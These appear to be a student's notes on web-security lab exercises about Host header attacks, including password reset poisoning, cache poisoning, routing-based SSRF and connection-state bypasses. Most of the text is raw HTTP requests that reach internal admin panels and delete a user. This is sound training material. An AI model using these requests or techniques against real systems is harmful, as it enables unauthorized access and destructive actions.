# Basic password reset poisoning
- You could change the host header to anything 

# Host header auth bypass
- Just change the host header to localhost

# Web cache via ambiguous request
- Use two host headers
- Make sure that the bad one is second
- Set exploit server to replace resources tracking js

# Routing SSRF
- If you put collaborator as the host, you would get DNS lookup
    - This means it is vulnerable
- Used intruder
    - set host header to 192.168.0.x where x is 1-254
- 161 gave a 200 on /admin
- Used this request to delete
```http
GET /admin/delete?csrf=0Xne3nIEScRVFmMVwXzI6ICwCMZUeHdI&username=carlos HTTP/2
Host: 192.168.0.161
Cookie: session=iFvrchUVCnqFL5lWG7It18e4MZneG69M; _lab=46%7cMCwCFE5O5R9S4xcBfu4WH8KQul4f0wQKAhQxwbQUPfKRH1jwUpoyam1W5yxK2RkHXQbDQ7jywRZ9gxiop%2fZF1%2ftfjDVj5ALSBD6kvjFkxYF%2fE9DZNgwym%2fa7%2fFh0QdFLCbbghurHjzkTuDpVInV%2bKCsf9KON8vpR9d%2fnzKDIu3Mqoro%3d
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://192.168.0.161/
```

# SSRF via flawed request parsing
- To get the ip I used an intruder attack on the identify request
- To identify
```http
GET https://0a3900c7030632aa85e3170300ce00bf.web-security-academy.net/ HTTP/2
Host: bxcx05useyb77254sgqpjnb73y9pxhl6.oastify.com
Cookie: session=kEv4o0UMMeiQquP5ETB1kQKFHg5RQwiV; _lab=46%7cMCwCFFNxeLoJLto2gCiu%2fV22zWiEjncLAhR0wnFTgxjspPENBzKi8f0O2COGQwgdj0Z8n5xlmh9roZau0nxDIjFv8G6tO2Uoo%2fg%2b1FEHX2sTbFKYgr1QCyOkt7MN%2bvNsBmhO91rISHD4IDmJhXs%2buHv3yxu8vlhOHo%2fuwj0iat4Bj8Q%3d
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
- To exploit
```http
GET https://0a3900c7030632aa85e3170300ce00bf.web-security-academy.net/admin/delete?csrf=SQjaH33VM96ttY0oO5YPldaUgLxP2Joi&username=carlos HTTP/2
Host: 192.168.0.28
Cookie: session=kEv4o0UMMeiQquP5ETB1kQKFHg5RQwiV; _lab=46%7cMCwCFFNxeLoJLto2gCiu%2fV22zWiEjncLAhR0wnFTgxjspPENBzKi8f0O2COGQwgdj0Z8n5xlmh9roZau0nxDIjFv8G6tO2Uoo%2fg%2b1FEHX2sTbFKYgr1QCyOkt7MN%2bvNsBmhO91rISHD4IDmJhXs%2buHv3yxu8vlhOHo%2fuwj0iat4Bj8Q%3d
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```


# Host validation via connection state
- Send the GET / request to Burp Repeater.
- Make the following adjustments:
    - Change the path to /admin.
    - Change Host header to 192.168.0.1.
- Send the request. Observe that you are simply redirected to the homepage.
- Duplicate the tab, then add both tabs to a new group.
- Select the first tab and make the following adjustments:
    - Change the path back to /.
    - Change the Host header back to YOUR-LAB-ID.h1-web-security-academy.net.
- Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
- Change the Connection header to keep-alive
- Req 1
```http
GET / HTTP/1.1
Host: 0a93004303441a208137343d00fc0036.h1-web-security-academy.net
Cookie: session=YTWBKIhXHUIHZy8sKdehhQOMANMk1s8y; _lab=46%7cMCwCFBUfr7B0h9%2fNQON5YmkRLYZl8j%2bHAhQT3Lz73RP7EphWIoxZVakvYUm2lnVlPJ2K6%2bV%2bT9%2fWn6CW%2faCAEc2D0nS12BTcP2RLiRunNI2jIm9lkk94nHKrkxjy%2fOFUpjfR9Jo9UtYKG5PdNtw6v63FhQ3Z2WO2wUusIZp9RofQfiuolQw%3d
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a93004303441a208137343d00fc0036.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
```
- Req 2
```http
GET /admin/delete?csrf=JtswdEH2qGxPiKpkNkG1AmCRmRFwWwBu&username=carlos HTTP/1.1
Host: 192.168.0.1
Cookie: session=YTWBKIhXHUIHZy8sKdehhQOMANMk1s8y; _lab=46%7cMCwCFBUfr7B0h9%2fNQON5YmkRLYZl8j%2bHAhQT3Lz73RP7EphWIoxZVakvYUm2lnVlPJ2K6%2bV%2bT9%2fWn6CW%2faCAEc2D0nS12BTcP2RLiRunNI2jIm9lkk94nHKrkxjy%2fOFUpjfR9Jo9UtYKG5PdNtw6v63FhQ3Z2WO2wUusIZp9RofQfiuolQw%3d
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a93004303441a208137343d00fc0036.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```
